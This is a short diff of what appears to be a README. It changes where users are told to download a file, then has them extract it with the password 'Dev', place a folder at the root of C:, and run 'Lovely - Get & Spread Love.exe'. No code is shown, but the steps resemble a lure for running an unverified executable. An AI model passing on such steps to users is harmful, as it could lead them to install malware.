@@ -25,7 +25,7 @@ Explore in light of this, and keep spreading the love.
 
 # Perform These Prior To Running
 ---------------------------------
-> Go to the link in the Mega Folder & download the file.
+> Go to the link in the Download folder & download the file.
 > Extract the File _ (Pass is Dev).
 > Move "TheFamilyProject" Folder In (C:) Drive Folder To Execute Properly.
 > Then Get The 'Lovely - Get & Spread Love.exe' File.
